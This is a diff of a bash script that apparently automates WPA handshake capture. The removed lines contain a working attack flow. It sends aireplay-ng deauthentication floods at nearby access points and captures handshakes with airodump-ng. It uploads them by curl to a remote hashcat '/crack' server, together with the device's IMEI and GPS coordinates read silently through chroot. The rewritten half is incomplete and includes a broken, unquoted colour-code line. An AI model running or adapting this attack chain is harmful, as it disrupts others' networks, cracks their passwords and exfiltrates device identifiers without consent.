@@ -1,157 +1,80 @@
 #!/bin/bash
 
-checkUtils() {
-  echo "Check utils"
-  if [ ! -f /bin/cap2hccapx ]; then
-    echo "No cap2hccapx"
-    echo "Please, install cap2hccapx:"
-    echo "git clone https://github.com/hashcat/hashcat-utils.git"
-    echo "cd hashcat-utils/src"
-    echo "make"
-    echo "chmod +x cap2hccapx.bin"
-    echo "cp cap2hccapx.bin /bin"
-    exit 1
-  fi
+interface=""
+serverAddr=""
+
+checkUtils(){
+        printf "Check utilities\n"
+
+        #airmon-ng
+        output=$(airmon-ng)
+        if [[ "$output" == *"PHY"* ]]; then
+
+                printf "airmon-ng....\033[32m Done\033[0m\n"
+        else
+                \033[31m <your text goes here> \033[0m
+                printf "airmon-ng....\033[31m Fail \033[0m\n"
+                exit 1
+        fi
+
+        #airodump-ng
+        output=$(airodump-ng)
+        if [[ "$output" == *"usage: airodump-ng"* ]]; then
+                printf "airodump-ng....\033[32m Done\033[0m\n"
+        else
+                printf "airodump-ng....\033[31m Fail \033[0m\n"
+                exit 1
+        fi
+
+        #cap2hccapx
+        output=`cap2hccapx 2>&1`
+        if [[ "$output" == *"usage: cap2hccapx input.pcap output.hccapx"* ]]; then
+                printf "cap2hccapx...\033[32m Done\033[0m\n"
+        else
+                printf "cap2hccapx....\033[31m Fail \033[0m\n"
+                exit 1
+        fi
+
+        printf "\n"
 }
 
-sendHandshake() {
-  # echo $1
-  # echo $2
-  long=$(chroot /proc/1/cwd/ dumpsys location | grep "LongitudeDegrees: " | awk -F' |,' '{print $16}')
-  echo "Long: "$long
-  lat=$(chroot /proc/1/cwd/ dumpsys location | grep "LatitudeDegrees: " | awk -F' |,' '{print $13}')
-  echo "Lat: "$lat
-  imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
-  echo "IMEI: "$imei
-  curl -i -m 1000000 -X POST -H "imei: $imei" -H "lon: $long" -H "lat: $lat" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/crack
-  if [[ $? == 0 ]]; then
-    rm $1
-  else
-    echo "Failed send file $1"
-  fi
+
+checkServer(){
+        curl http://$serverAddr/handshakes > /dev/null
+        if [[ $? == 0 ]]; then
+                echo "Server status - working"
+        else
+                echo "Server status - not working"
+                exit 1
+        fi
 }
 
-checkHandshakes() {
-  echo $1
-  echo "Check handshakes..."
-  output=$(cap2hccapx /home/kali/shakes-01.cap /home/kali/cleanshakes.hccapx)
-  echo $output
-  #echo $output
-  if [[ "$output" == *"Written 0"* ]] || [[ "$output" == *"Networks detected: 0"* ]]; then
-    echo "No handshakes"
-    rm /home/kali/cleanshakes.hccapx >/dev/null
-  else
-    echo "Handshakes detected!!!"
-    if [[ -d /home/kali/shakes ]]; then
-      if [[ $(ls /home/kali/shakes/ | wc -l) -ne 0 ]]; then
-        lastNum=$(($(head -n 1 /home/kali/shakes/.counter) + 1))
-        mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake${lastNum}
-        echo $lastNum >/home/kali/shakes/.counter
-        sendHandshake /home/kali/shakes/shake${lastNum} $1
-      else
-        mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
-        touch /home/kali/shakes/.counter
-        echo "1" >/home/kali/shakes/.counter
-        sendHandshake /home/kali/shakes/shake1 $1
-      fi
-    else
-      mkdir /home/kali/shakes
-      chmod 777 -R /home/kali/shakes
-      mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
-      touch /home/kali/shakes/.counter
-      echo "1" >/home/kali/shakes/.counter
-      sendHandshake /home/kali/shakes/shake1 $1
-    fi
-  fi
-  echo ""
+#checkInterface(){}
+
+getparams(){
+        printf "Please set the wireless interface(e.g. wlan0):\n"
+        read;
+        interface=${REPLY}
+        airmon-ng start $interface
+
+        printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\n"
+        read;
+        serverAddr=${REPLY}
+        checkServer
+
+        printf "Please set the attack mode(active or passive)\n"
+        read;
+        mode=${REPLY}
 }
 
-active() {
-  trap "rm /home/kali/sha* > /dev/null;rm /home/kali/cleanshakes.hccapx > /dev/null" EXIT
-  airmon-ng start $2
-  echo "Collect APs..."
-  timeout 30 airodump-ng -w /home/kali/shakesCollector $2 </dev/null >/dev/null
-  counter=0
-  while IFS=, read -r bssid firsttimeseen lasttimeseen channel speed privacy cipher auth power beacons; do
-    if [[ $counter -lt 2 ]] 
-    then
-            counter=$(($counter + 1))
-            continue
-    fi
-
-    if [[ $power -lt -70 ]]
-    then
-            continue
-    fi
-    if [[ $power == "" ]]
-    then 
-            break
-    fi
-    echo "BSSID:" $bssid
-    echo "Channel:" $channel
-    echo "Power: " $power
-
-    iwconfig $2 channel $channel
-    echo "Start airodump..."
-    airodump-ng --bssid $bssid --channel $channel -w /home/kali/shakes $2 </dev/null >/dev/null &
-    pid=`echo $!`
-    echo "Start sending deauth frame injection..."
-    aireplay-ng -a $bssid -0 10 $2 
-    injectionExitCode=`echo $?`
-    if [[ $injectionExitCode -ne 0 ]]
-    then
-            kill -9 $pid
-            continue
-    fi
-    sleep 20
-    kill -9 $pid
-    checkHandshakes $1
-    rm /home/kali/shakes-* >/dev/null
-  done < <(tail -n +2  /home/kali/shakesCollector-01.csv)
-
+cleanup(){
+        rm /home/kali/hscollector/shakes-* &> /dev/null
 }
 
-passive() {
-  trap 'checkHandshakes;rm /home/kali/shakes-*; exit 1' EXIT
-  airmon-ng start $2 >/dev/null
-  echo "Start airodump.."
-  timeout 60 airodump-ng -w /home/kali/shakes $2 </dev/null >/dev/null
-  checkHandshakes $1
-  rm /home/kali/shakes-*
-  passive $1 $2
+trap cleanup SIGINT SIGTERM ERR EXIT
+
+main(){
+        checkUtils
+        getparams
 }
-
-checkHashcatServer() {
-  curl http://$1:9000/handshakes > /dev/null
-  if [[ $? == 0 ]]; then
-    echo "Server status - working"
-  else
-    echo "Server status - not working"
-    exit 1
-  fi
-}
-
-checkHashcatServer $2
-if [[ $1 == "p" ]]; then
-  echo "Selected passive mode"
-  if [[ $2 == "" ]]; then
-    echo "Please enter hashcat server address second argument"
-    exit 1
-  else
-    echo "Hashcat server address: $2"
-    passive $2 $3
-  fi
-
-elif [[ $1 == "a" ]]; then
-  echo "Selected active mode"
-  if [[ $2 == "" ]]; then
-    echo "Please enter hashcat server address as second argument"
-    exit 1
-  else
-    echo "Hashcat server address: $2"
-    active $2 $3
-  fi
-else
-  echo "Use a - active or p - passive as first argument"
-  exit 1
-fi
+main
